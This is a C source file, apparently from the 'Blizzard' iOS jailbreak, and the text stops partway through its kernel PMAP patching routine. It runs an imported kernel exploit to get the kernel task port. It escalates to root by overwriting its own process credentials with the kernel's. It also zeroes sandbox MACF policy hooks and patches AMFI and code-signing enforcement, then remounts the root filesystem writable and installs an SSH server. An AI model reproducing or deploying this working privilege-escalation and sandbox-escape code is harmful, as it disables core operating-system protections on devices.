//
//  blizzardJailbreak.c
//
//  Created by GeoSn0w on 8/10/20.
//  Copyright © 2022 GeoSn0w. All rights reserved.
//

#import <Foundation/Foundation.h>
#include "blizzardJailbreak.h"
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <copyfile.h>
#include <netinet/in.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <sys/mman.h>
#include <spawn.h>
#include <sys/utsname.h>
#include "BlizzardLog.h"
#import "../Exploits/Phoenix Exploit/exploit.h"
#import "../PatchFinder/patchfinder.h"
#import "../Kernel Tools/KernMemory.h"
#include "BlizzardSpawnerTools.h"

mach_port_t kern_task = 0;
#define KERNEL_HEADER_SIZE (0x1000)
uint32_t sandbox_sbops;
kaddr_t text_vmaddr = 0;
size_t text_vmsize = 0;
kaddr_t text_text_sec_addr = 0;
size_t text_text_sec_size = 0;
kaddr_t text_const_sec_addr = 0;
size_t text_const_sec_size = 0;
kaddr_t text_cstring_sec_addr = 0;
size_t text_cstring_sec_size = 0;
kaddr_t text_os_log_sec_addr = 0;
size_t text_os_log_sec_size = 0;
kaddr_t data_vmaddr = 0;
size_t data_vmsize = 0;
kaddr_t KernelOffset(kaddr_t base, kaddr_t off);
kaddr_t allproc = 0;
static uint8_t *kdata = NULL;
static size_t ksize = 0;
static uint64_t kernel_entry = 0;
uint64_t kerndumpbase = -1;
static void *kernel_mh = 0;
uint32_t myProc;
uint32_t myUcred;
int processID;
char **environment;

// Sandbox Policy Stuff
struct mac_policy_ops {
    uint32_t mpo_audit_check_postselect;
    uint32_t mpo_audit_check_preselect;
    uint32_t mpo_bpfdesc_label_associate;
    uint32_t mpo_bpfdesc_label_destroy;
    uint32_t mpo_bpfdesc_label_init;
    uint32_t mpo_bpfdesc_check_receive;
    uint32_t mpo_cred_check_label_update_execve;
    uint32_t mpo_cred_check_label_update;
    uint32_t mpo_cred_check_visible;
    uint32_t mpo_cred_label_associate_fork;
    uint32_t mpo_cred_label_associate_kernel;
    uint32_t mpo_cred_label_associate;
    uint32_t mpo_cred_label_associate_user;
    uint32_t mpo_cred_label_destroy;
    uint32_t mpo_cred_label_externalize_audit;
    uint32_t mpo_cred_label_externalize;
    uint32_t mpo_cred_label_init;
    uint32_t mpo_cred_label_internalize;
    uint32_t mpo_cred_label_update_execve;
    uint32_t mpo_cred_label_update;
    uint32_t mpo_devfs_label_associate_device;
    uint32_t mpo_devfs_label_associate_directory;
    uint32_t mpo_devfs_label_copy;
    uint32_t mpo_devfs_label_destroy;
    uint32_t mpo_devfs_label_init;
    uint32_t mpo_devfs_label_update;
    uint32_t mpo_file_check_change_offset;
    uint32_t mpo_file_check_create;
    uint32_t mpo_file_check_dup;
    uint32_t mpo_file_check_fcntl;
    uint32_t mpo_file_check_get_offset;
    uint32_t mpo_file_check_get;
    uint32_t mpo_file_check_inherit;
    uint32_t mpo_file_check_ioctl;
    uint32_t mpo_file_check_lock;
    uint32_t mpo_file_check_mmap_downgrade;
    uint32_t mpo_file_check_mmap;
    uint32_t mpo_file_check_receive;
    uint32_t mpo_file_check_set;
    uint32_t mpo_file_label_init;
    uint32_t mpo_file_label_destroy;
    uint32_t mpo_file_label_associate;
    uint32_t mpo_ifnet_check_label_update;
    uint32_t mpo_ifnet_check_transmit;
    uint32_t mpo_ifnet_label_associate;
    uint32_t mpo_ifnet_label_copy;
    uint32_t mpo_ifnet_label_destroy;
    uint32_t mpo_ifnet_label_externalize;
    uint32_t mpo_ifnet_label_init;
    uint32_t mpo_ifnet_label_internalize;
    uint32_t mpo_ifnet_label_update;
    uint32_t mpo_ifnet_label_recycle;
    uint32_t mpo_inpcb_check_deliver;
    uint32_t mpo_inpcb_label_associate;
    uint32_t mpo_inpcb_label_destroy;
    uint32_t mpo_inpcb_label_init;
    uint32_t mpo_inpcb_label_recycle;
    uint32_t mpo_inpcb_label_update;
    uint32_t mpo_iokit_check_device;
    uint32_t mpo_ipq_label_associate;
    uint32_t mpo_ipq_label_compare;
    uint32_t mpo_ipq_label_destroy;
    uint32_t mpo_ipq_label_init;
    uint32_t mpo_ipq_label_update;
    uint32_t mpo_file_check_library_validation;
    uint32_t mpo_vnode_notify_setacl;
    uint32_t mpo_vnode_notify_setattrlist;
    uint32_t mpo_vnode_notify_setextattr;
    uint32_t mpo_vnode_notify_setflags;
    uint32_t mpo_vnode_notify_setmode;
    uint32_t mpo_vnode_notify_setowner;
    uint32_t mpo_vnode_notify_setutimes;
    uint32_t mpo_vnode_notify_truncate;
    uint32_t mpo_mbuf_label_associate_bpfdesc;
    uint32_t mpo_mbuf_label_associate_ifnet;
    uint32_t mpo_mbuf_label_associate_inpcb;
    uint32_t mpo_mbuf_label_associate_ipq;
    uint32_t mpo_mbuf_label_associate_linklayer;
    uint32_t mpo_mbuf_label_associate_multicast_encap;
    uint32_t mpo_mbuf_label_associate_netlayer;
    uint32_t mpo_mbuf_label_associate_socket;
    uint32_t mpo_mbuf_label_copy;
    uint32_t mpo_mbuf_label_destroy;
    uint32_t mpo_mbuf_label_init;
    uint32_t mpo_mount_check_fsctl;
    uint32_t mpo_mount_check_getattr;
    uint32_t mpo_mount_check_label_update;
    uint32_t mpo_mount_check_mount;
    uint32_t mpo_mount_check_remount;
    uint32_t mpo_mount_check_setattr;
    uint32_t mpo_mount_check_stat;
    uint32_t mpo_mount_check_umount;
    uint32_t mpo_mount_label_associate;
    uint32_t mpo_mount_label_destroy;
    uint32_t mpo_mount_label_externalize;
    uint32_t mpo_mount_label_init;
    uint32_t mpo_mount_label_internalize;
    uint32_t mpo_netinet_fragment;
    uint32_t mpo_netinet_icmp_reply;
    uint32_t mpo_netinet_tcp_reply;
    uint32_t mpo_pipe_check_ioctl;
    uint32_t mpo_pipe_check_kqfilter;
    uint32_t mpo_pipe_check_label_update;
    uint32_t mpo_pipe_check_read;
    uint32_t mpo_pipe_check_select;
    uint32_t mpo_pipe_check_stat;
    uint32_t mpo_pipe_check_write;
    uint32_t mpo_pipe_label_associate;
    uint32_t mpo_pipe_label_copy;
    uint32_t mpo_pipe_label_destroy;
    uint32_t mpo_pipe_label_externalize;
    uint32_t mpo_pipe_label_init;
    uint32_t mpo_pipe_label_internalize;
    uint32_t mpo_pipe_label_update;
    uint32_t mpo_policy_destroy;
    uint32_t mpo_policy_init;
    uint32_t mpo_policy_initbsd;
    uint32_t mpo_policy_syscall;
    uint32_t mpo_system_check_sysctlbyname;
    uint32_t mpo_proc_check_inherit_ipc_ports;
    uint32_t mpo_vnode_check_rename;
    uint32_t mpo_kext_check_query;
    uint32_t mpo_iokit_check_nvram_get;
    uint32_t mpo_iokit_check_nvram_set;
    uint32_t mpo_iokit_check_nvram_delete;
    uint32_t mpo_proc_check_expose_task;
    uint32_t mpo_proc_check_set_host_special_port;
    uint32_t mpo_proc_check_set_host_exception_port;
    uint32_t mpo_exc_action_check_exception_send;
    uint32_t mpo_exc_action_label_associate;
    uint32_t mpo_exc_action_label_populate;
    uint32_t mpo_exc_action_label_destroy;
    uint32_t mpo_exc_action_label_init;
    uint32_t mpo_exc_action_label_update;
    uint32_t mpo_reserved1;
    uint32_t mpo_reserved2;
    uint32_t mpo_reserved3;
    uint32_t mpo_reserved4;
    uint32_t mpo_skywalk_flow_check_connect;
    uint32_t mpo_skywalk_flow_check_listen;
    uint32_t mpo_posixsem_check_create;
    uint32_t mpo_posixsem_check_open;
    uint32_t mpo_posixsem_check_post;
    uint32_t mpo_posixsem_check_unlink;
    uint32_t mpo_posixsem_check_wait;
    uint32_t mpo_posixsem_label_associate;
    uint32_t mpo_posixsem_label_destroy;
    uint32_t mpo_posixsem_label_init;
    uint32_t mpo_posixshm_check_create;
    uint32_t mpo_posixshm_check_mmap;
    uint32_t mpo_posixshm_check_open;
    uint32_t mpo_posixshm_check_stat;
    uint32_t mpo_posixshm_check_truncate;
    uint32_t mpo_posixshm_check_unlink;
    uint32_t mpo_posixshm_label_associate;
    uint32_t mpo_posixshm_label_destroy;
    uint32_t mpo_posixshm_label_init;
    uint32_t mpo_proc_check_debug;
    uint32_t mpo_proc_check_fork;
    uint32_t mpo_proc_check_get_task_name;
    uint32_t mpo_proc_check_get_task;
    uint32_t mpo_proc_check_getaudit;
    uint32_t mpo_proc_check_getauid;
    uint32_t mpo_proc_check_getlcid;
    uint32_t mpo_proc_check_mprotect;
    uint32_t mpo_proc_check_sched;
    uint32_t mpo_proc_check_setaudit;
    uint32_t mpo_proc_check_setauid;
    uint32_t mpo_proc_check_setlcid;
    uint32_t mpo_proc_check_signal;
    uint32_t mpo_proc_check_wait;
    uint32_t mpo_proc_label_destroy;
    uint32_t mpo_proc_label_init;
    uint32_t mpo_socket_check_accept;
    uint32_t mpo_socket_check_accepted;
    uint32_t mpo_socket_check_bind;
    uint32_t mpo_socket_check_connect;
    uint32_t mpo_socket_check_create;
    uint32_t mpo_socket_check_deliver;
    uint32_t mpo_socket_check_kqfilter;
    uint32_t mpo_socket_check_label_update;
    uint32_t mpo_socket_check_listen;
    uint32_t mpo_socket_check_receive;
    uint32_t mpo_socket_check_received;
    uint32_t mpo_socket_check_select;
    uint32_t mpo_socket_check_send;
    uint32_t mpo_socket_check_stat;
    uint32_t mpo_socket_check_setsockopt;
    uint32_t mpo_socket_check_getsockopt;
    uint32_t mpo_socket_label_associate_accept;
    uint32_t mpo_socket_label_associate;
    uint32_t mpo_socket_label_copy;
    uint32_t mpo_socket_label_destroy;
    uint32_t mpo_socket_label_externalize;
    uint32_t mpo_socket_label_init;
    uint32_t mpo_socket_label_internalize;
    uint32_t mpo_socket_label_update;
    uint32_t mpo_socketpeer_label_associate_mbuf;
    uint32_t mpo_socketpeer_label_associate_socket;
    uint32_t mpo_socketpeer_label_destroy;
    uint32_t mpo_socketpeer_label_externalize;
    uint32_t mpo_socketpeer_label_init;
    uint32_t mpo_system_check_acct;
    uint32_t mpo_system_check_audit;
    uint32_t mpo_system_check_auditctl;
    uint32_t mpo_system_check_auditon;
    uint32_t mpo_system_check_host_priv;
    uint32_t mpo_system_check_nfsd;
    uint32_t mpo_system_check_reboot;
    uint32_t mpo_system_check_settime;
    uint32_t mpo_system_check_swapoff;
    uint32_t mpo_system_check_swapon;
    uint32_t mpo_socket_check_ioctl;
    uint32_t mpo_sysvmsg_label_associate;
    uint32_t mpo_sysvmsg_label_destroy;
    uint32_t mpo_sysvmsg_label_init;
    uint32_t mpo_sysvmsg_label_recycle;
    uint32_t mpo_sysvmsq_check_enqueue;
    uint32_t mpo_sysvmsq_check_msgrcv;
    uint32_t mpo_sysvmsq_check_msgrmid;
    uint32_t mpo_sysvmsq_check_msqctl;
    uint32_t mpo_sysvmsq_check_msqget;
    uint32_t mpo_sysvmsq_check_msqrcv;
    uint32_t mpo_sysvmsq_check_msqsnd;
    uint32_t mpo_sysvmsq_label_associate;
    uint32_t mpo_sysvmsq_label_destroy;
    uint32_t mpo_sysvmsq_label_init;
    uint32_t mpo_sysvmsq_label_recycle;
    uint32_t mpo_sysvsem_check_semctl;
    uint32_t mpo_sysvsem_check_semget;
    uint32_t mpo_sysvsem_check_semop;
    uint32_t mpo_sysvsem_label_associate;
    uint32_t mpo_sysvsem_label_destroy;
    uint32_t mpo_sysvsem_label_init;
    uint32_t mpo_sysvsem_label_recycle;
    uint32_t mpo_sysvshm_check_shmat;
    uint32_t mpo_sysvshm_check_shmctl;
    uint32_t mpo_sysvshm_check_shmdt;
    uint32_t mpo_sysvshm_check_shmget;
    uint32_t mpo_sysvshm_label_associate;
    uint32_t mpo_sysvshm_label_destroy;
    uint32_t mpo_sysvshm_label_init;
    uint32_t mpo_sysvshm_label_recycle;
    uint32_t mpo_proc_notify_exit;
    uint32_t mpo_mount_check_snapshot_revert;
    uint32_t mpo_vnode_check_getattr;
    uint32_t mpo_mount_check_snapshot_create;
    uint32_t mpo_mount_check_snapshot_delete;
    uint32_t mpo_vnode_check_clone;
    uint32_t mpo_proc_check_get_cs_info;
    uint32_t mpo_proc_check_set_cs_info;
    uint32_t mpo_iokit_check_hid_control;
    uint32_t mpo_vnode_check_access;
    uint32_t mpo_vnode_check_chdir;
    uint32_t mpo_vnode_check_chroot;
    uint32_t mpo_vnode_check_create;
    uint32_t mpo_vnode_check_deleteextattr;
    uint32_t mpo_vnode_check_exchangedata;
    uint32_t mpo_vnode_check_exec;
    uint32_t mpo_vnode_check_getattrlist;
    uint32_t mpo_vnode_check_getextattr;
    uint32_t mpo_vnode_check_ioctl;
    uint32_t mpo_vnode_check_kqfilter;
    uint32_t mpo_vnode_check_label_update;
    uint32_t mpo_vnode_check_link;
    uint32_t mpo_vnode_check_listextattr;
    uint32_t mpo_vnode_check_lookup;
    uint32_t mpo_vnode_check_open;
    uint32_t mpo_vnode_check_read;
    uint32_t mpo_vnode_check_readdir;
    uint32_t mpo_vnode_check_readlink;
    uint32_t mpo_vnode_check_rename_from;
    uint32_t mpo_vnode_check_rename_to;
    uint32_t mpo_vnode_check_revoke;
    uint32_t mpo_vnode_check_select;
    uint32_t mpo_vnode_check_setattrlist;
    uint32_t mpo_vnode_check_setextattr;
    uint32_t mpo_vnode_check_setflags;
    uint32_t mpo_vnode_check_setmode;
    uint32_t mpo_vnode_check_setowner;
    uint32_t mpo_vnode_check_setutimes;
    uint32_t mpo_vnode_check_stat;
    uint32_t mpo_vnode_check_truncate;
    uint32_t mpo_vnode_check_unlink;
    uint32_t mpo_vnode_check_write;
    uint32_t mpo_vnode_label_associate_devfs;
    uint32_t mpo_vnode_label_associate_extattr;
    uint32_t mpo_vnode_label_associate_file;
    uint32_t mpo_vnode_label_associate_pipe;
    uint32_t mpo_vnode_label_associate_posixsem;
    uint32_t mpo_vnode_label_associate_posixshm;
    uint32_t mpo_vnode_label_associate_singlelabel;
    uint32_t mpo_vnode_label_associate_socket;
    uint32_t mpo_vnode_label_copy;
    uint32_t mpo_vnode_label_destroy;
    uint32_t mpo_vnode_label_externalize_audit;
    uint32_t mpo_vnode_label_externalize;
    uint32_t mpo_vnode_label_init;
    uint32_t mpo_vnode_label_internalize;
    uint32_t mpo_vnode_label_recycle;
    uint32_t mpo_vnode_label_store;
    uint32_t mpo_vnode_label_update_extattr;
    uint32_t mpo_vnode_label_update;
    uint32_t mpo_vnode_notify_create;
    uint32_t mpo_vnode_check_signature;
    uint32_t mpo_vnode_check_uipc_bind;
    uint32_t mpo_vnode_check_uipc_connect;
    uint32_t mpo_proc_check_run_cs_invalid;
    uint32_t mpo_proc_check_suspend_resume;
    uint32_t mpo_thread_userret;
    uint32_t mpo_iokit_check_set_properties;
    uint32_t mpo_system_check_chud;
    uint32_t mpo_vnode_check_searchfs;
    uint32_t mpo_priv_check;
    uint32_t mpo_priv_grant;
    uint32_t mpo_proc_check_map_anon;
    uint32_t mpo_vnode_check_fsgetpath;
    uint32_t mpo_iokit_check_open;
    uint32_t mpo_proc_check_ledger;
    uint32_t mpo_vnode_notify_rename;
    uint32_t mpo_vnode_check_setacl;
    uint32_t mpo_vnode_notify_deleteextattr;
    uint32_t mpo_system_check_kas_info;
    uint32_t mpo_vnode_check_lookup_preflight;
    uint32_t mpo_vnode_notify_open;
    uint32_t mpo_system_check_info;
    uint32_t mpo_pty_notify_grant;
    uint32_t mpo_pty_notify_close;
    uint32_t mpo_vnode_find_sigs;
    uint32_t mpo_kext_check_load;
    uint32_t mpo_kext_check_unload;
    uint32_t mpo_proc_check_proc_info;
    uint32_t mpo_vnode_notify_link;
    uint32_t mpo_iokit_check_filter_properties;
    uint32_t mpo_iokit_check_get_property;
};



kaddr_t KernelOffset(kaddr_t base, kaddr_t off){
    if(!off) {
        return 0;
    }
    return base+off;
}

static int blizzardInitializeKernel(kaddr_t base) {
    unsigned i;
    uint8_t buf[KERNEL_HEADER_SIZE];
    const struct mach_header *hdr = (struct mach_header *)buf;
    const uint8_t *q;
    uint64_t min = -1;
    uint64_t max = 0;
    
    copyin(buf, base, sizeof(buf));
    q = buf + sizeof(struct mach_header) + 0;
    
    for (i = 0; i < hdr->ncmds; i++) {
        const struct load_command *cmd = (struct load_command *)q;
        if (cmd->cmd == LC_SEGMENT) {
            const struct segment_command *seg = (struct segment_command *)q;
            if (min > seg->vmaddr) {
                min = seg->vmaddr;
            }
            if (max < seg->vmaddr + seg->vmsize) {
                max = seg->vmaddr + seg->vmsize;
            }
            if (!strcmp(seg->segname, "__TEXT")) {
                text_vmaddr = seg->vmaddr;
                text_vmsize = seg->vmsize;
                
                const struct section *sec = (struct section *)(seg + 1);
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (!strcmp(sec[j].sectname, "__text")) {
                        text_text_sec_addr = sec[j].addr;
                        text_text_sec_size = sec[j].size;
                    } else if (!strcmp(sec[j].sectname, "__const")) {
                        text_const_sec_addr = sec[j].addr;
                        text_const_sec_size = sec[j].size;
                    } else if (!strcmp(sec[j].sectname, "__cstring")) {
                        text_cstring_sec_addr = sec[j].addr;
                        text_cstring_sec_size = sec[j].size;
                    } else if (!strcmp(sec[j].sectname, "__os_log")) {
                        text_os_log_sec_addr = sec[j].addr;
                        text_os_log_sec_size = sec[j].size;
                    }
                }
            } else if (!strcmp(seg->segname, "__DATA")) {
                data_vmaddr = seg->vmaddr;
                data_vmsize = seg->vmsize;
            }
        }
        if (cmd->cmd == LC_UNIXTHREAD) {
            uint32_t *ptr = (uint32_t *)(cmd + 1);
            uint32_t flavor = ptr[0];
            struct {
                uint32_t    r[13];  /* General purpose register r0-r12 */
                uint32_t    sp;     /* Stack pointer r13 */
                uint32_t    lr;     /* Link register r14 */
                uint32_t    pc;     /* Program counter r15 */
                uint32_t    cpsr;   /* Current program status register */
            } *thread = (void *)(ptr + 2);
            if (flavor == 6) {
                kernel_entry = thread->pc;
            }
        }
        q = q + cmd->cmdsize;
    }
    
    kerndumpbase = min;
    ksize = max - min;
    
    kdata = malloc(ksize);
    if (!kdata) {
        return -1;
    }
    
    copyin(kdata, kerndumpbase, ksize);
    
    kernel_mh = kdata + base - min;
    return 0;
}

int runKernelExploit(){
    printf("Blizzard is exploting the kernel...\n");
    exploit();
    kern_task = tfp0;
    if (tfp0 != 0){
        printf("Got tfp0: %0xllx\n", kern_task);
        return 0;
    }
    return -1;
}

int getAllProcStub(){
    blizzardInitializeKernel(KernelBase);
    printf("Getting ALLPROC...\n");
    if (blizzardGetAllproc() != 0){
        return 0;
    }
    return -1;
}

int getRootStub(){
    printf("Getting ROOT...\n");
    if (blizzardGetRoot() == 0){
        return 0;
    }
    return -1;
}

int patchSandboxStub(){
    printf("Escaping SandBox...\n");
    if (blizzardEscapeSandbox() == 0){
        return 0;
    }
    return -1;
}

// Big thanks to Jonathan Seals for this.
#define ptrSize sizeof(uintptr_t)

int updateKernelVersionString(){
    char *newVersionString = "BlizzardJB Kernel";
    uintptr_t versionPtr = 0;
    struct utsname u = {0};
    uname(&u);
        
    mach_port_t kernel_task = tfp0;
    vm_address_t kernel_base;
    kernel_base = KernelBase;
        
    uintptr_t darwinTextPtr = 0;
    char *buf;
    vm_size_t sz;
    uintptr_t TEXT_const = 0;
    uint32_t sizeofTEXT_const = 0;
    uintptr_t DATA_data = 0;
    uint32_t sizeofDATA_data = 0;
        
    char *sectName = "__const";
        
    for (uintptr_t i=kernel_base; i < (kernel_base+0x2000); i+=(ptrSize)) {
        int ret = vm_read(kernel_task, i, 0x150, (vm_offset_t*)&buf, (mach_msg_type_number_t*)&sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
        }
            
        if (!strcmp(buf, sectName) && !strcmp(buf+0x10, "__TEXT")) {
            TEXT_const = *(uintptr_t*)(buf+0x20);
            sizeofTEXT_const = *(uintptr_t*)(buf+(0x20 + ptrSize));
            
        } else if (!strcmp(buf, "__data") && !strcmp(buf+0x10, "__DATA")) {
            DATA_data = *(uintptr_t*)(buf+0x20);
            sizeofDATA_data = *(uintptr_t*)(buf+(0x20 + ptrSize));
        }
        
        if (TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)
            break;
    }
        
    if (!(TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)) {
        printf("Error parsing kernel macho\n");
        return -1;
    }
        
    for (uintptr_t i = TEXT_const; i < (TEXT_const+sizeofTEXT_const); i += 2) {
        int ret = vm_read_overwrite(kernel_task, i, strlen("Darwin Kernel Version"), (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            return -1;
        }
        if (!memcmp(buf, "Darwin Kernel Version", strlen("Darwin Kernel Version"))) {
            darwinTextPtr = i;
            break;
        }
    }
        
    if (!darwinTextPtr) {
        printf("Error finding Darwin text\n");
        return -1;
    }
        
    uintptr_t versionTextXref[ptrSize];
    versionTextXref[0] = darwinTextPtr;
        
    for (uintptr_t i = DATA_data; i < (DATA_data+sizeofDATA_data); i += ptrSize) {
            int ret = vm_read_overwrite(kernel_task, i, ptrSize, (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            return -1;
        }
            
        if (!memcmp(buf, versionTextXref, ptrSize)) {
            versionPtr = i;
            break;
        }
    }
        
    if (!versionPtr) {
        printf("Error finding _version pointer, did you already patch it?\n");
        return -1;
    }
        
    kern_return_t ret;
    vm_address_t newStringPtr = 0;
    vm_allocate(kernel_task, &newStringPtr, strlen(newVersionString), VM_FLAGS_ANYWHERE);
        
    ret = vm_write(kernel_task, newStringPtr, (vm_offset_t)newVersionString, strlen(newVersionString));
    if (ret != KERN_SUCCESS) {
        printf("Failed vm_write %i\n", ret);
        exit(-1);
    }
        
    ret = vm_write(kernel_task, versionPtr, (vm_offset_t)&newStringPtr, ptrSize);
    if (ret != KERN_SUCCESS) {
        printf("Failed vm_write %i\n", ret);
        return -1;
    } else {
        memset(&u, 0x0, sizeof(struct utsname));
        uname(&u);
        return 0;
    }
}

int applyKernelPatchesStub(){
    printf("Patching Kernel PMAP...\n");
    blizzardPatchPMAP();
    printf("Patching mount_common MACF check...\n");
    patch_mount_common();
    printf("Patching cs_enforcement_disable...\n");
    patch_cs_enforcement_disable();
    printf("Patching amfi_pe_i_can_has_debugger...\n");
    patch_amfi_pe_i_can_has_debugger();
    patch_second_amfi_pe_i_can_has_debugger();
    printf("Patching AMFI File MMAP...\n");
    patch_amfi_mmap();
    printf("Patching Sandbox' pe_I_can_has_debugger...\n");
    patch_sb_i_can_has_debugger();
    updateKernelVersionString();
    return 0;
}

int remountROOTFSStub(){
    printf("Remounting Root File System as R/W...\n");
    if (blizzardRemountRootFS() == 0){
        return 0;
    }
    return -1;
}

int installBootstrapStub(){
    printf("Preparing to install Blizzard Bootstrap...\n");
     if (checkIfBootstrapPresent() != -1){
         if (getBootstrapReady() != 0) {
             printf("[!] Bootstrap Preparation Failure! Jailbreak Failed\n");
             return -1;
         } else {
             printf("Installing Dropbear...\n");
             installDropbearSSH();
             printf("Running post-install fixes...\n");
             blizzardPostInstFixup();
             return 0;
         }
     } else {
         blizzardPostInstFixup();
         return 0;
     }
    return -1;
}

int blizzardGetTFP0(){
    
    if (kern_task != 0){
        
    } else {
        printf("FAILED to obtain Kernel Task Port!\n");
    }
    return 0;
}

kaddr_t blizzardGetAllproc(){
    allproc = KernelOffset(KernelBase,find_allproc(KernelBase, kdata, ksize));
    
    if (allproc == 0){
        printf("Cannot retrieve ALLPROC!\n");
        return -1;
    }
    
    printf("[+] Successfully got AllProc: 0x%x\n", allproc);
    return allproc;
}

int blizzardGetRoot(){
    pid_t currentUserID = getuid();
    printf("[i] Current User ID: %d\n", getuid());
    vm_size_t sz = 4;
    
        if (currentUserID != 0){
            uint32_t kproc = 0;
            myProc = 0;
            myUcred = 0;
            pid_t mypid = getpid();
            uint32_t proc = 0;
            vm_read_overwrite(tfp0, allproc, sz, (vm_address_t)&proc, &sz);
            while (proc) {
                uint32_t pid = 0;
                vm_read_overwrite(tfp0, proc + 8, sz, (vm_address_t)&pid, &sz);
                if (pid == mypid) {
                    myProc = proc;
                } else if (pid == 0) {
                    kproc = proc;
                }
                vm_read_overwrite(tfp0, proc, sz, (vm_address_t)&proc, &sz);
            }
            vm_read_overwrite(tfp0, myProc + 0xa4, sz, (vm_address_t)&myUcred, &sz);
            uint32_t kcred = 0;
            vm_read_overwrite(tfp0, kproc + 0xa4, sz, (vm_address_t)&kcred, &sz);
            vm_write(tfp0, myProc + 0xa4, (vm_address_t)&kcred, sz);
            setuid(0);
            printf("[+] Got ROOT! Current User ID: %x\n", getuid());
            return 0;
        }
    return -1;
}

int blizzardEscapeSandbox(){
    printf("[i] Preparing to escape SandBox...\n");
    printf("[i] Getting SBOPS Offset...\n");
    sandbox_sbops = find_sbops(KernelBase, kdata, 32 * 1024 * 1024);
    
    if (sandbox_sbops != 0){
        printf("[+] Found SBOPS offset: %x\n", sandbox_sbops);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
        WriteKernel32(KernelBase + sandbox_sbops + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
        
        printf("[i] Testing current SandBox conditions...\n");
        
        FILE *testFile = fopen("/var/mobile/blizzard", "w");
        if (!testFile) {
            printf("[!] Failed to unsandbox process! Patch failed.\n");
             return -2;
        }
        else {
            printf("[+] Successfully escaped Sandbox and patched policies.\n");
        }
        
        return 0;
    }
    printf("[-] Cannot find SBOPS offset. Aborting...\n");
    return -1;
}

#define TTB_SIZE                4096
#define L1_SECT_S_BIT           (1 << 16)
#define L1_SECT_PROTO           (1 << 1)
#define L1_SECT_AP_URW          (1 << 10) | (1 << 11)
#define L1_SECT_APX             (1 << 15)
#define L1_SECT_DEFPROT         (L1_SECT_AP_URW | L1_SECT_APX)
#define L1_SECT_SORDER          (0)
#define L1_SECT_DEFCACHE        (L1_SECT_SORDER)
#define L1_PROTO_TTE(entry)     (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)

uint32_t pmaps[TTB_SIZE];
int page_maps_count = 0;

int blizzardPatchPMAP() {
    uint32_t kernel_pmap            = KernelOffset(KernelBase, find_pmap_location(KernelBase, kdata, ksize));
    uint32_t kernel_pmap_store      = ReadKernel32(kernel_pmap);
